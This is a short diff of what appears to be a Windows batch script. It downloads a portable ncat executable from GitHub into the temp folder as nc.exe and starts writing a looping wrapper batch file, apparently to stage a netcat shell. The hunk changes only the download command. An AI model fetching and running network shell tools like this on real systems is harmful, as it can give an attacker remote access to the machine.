@@ -2,7 +2,7 @@
 
 cd %TEMP%
 
-curl https://github.com/cyberisltd/NcatPortable/blob/master/ncat.exe > nc.exe
+Invoke-WebRequest "https://github.com/cyberisltd/NcatPortable/blob/master/ncat.exe?raw=true" -OutFile .\nc.exe
 
 echo @echo off > wncat.bat
 echo :loop >> wncat.bat
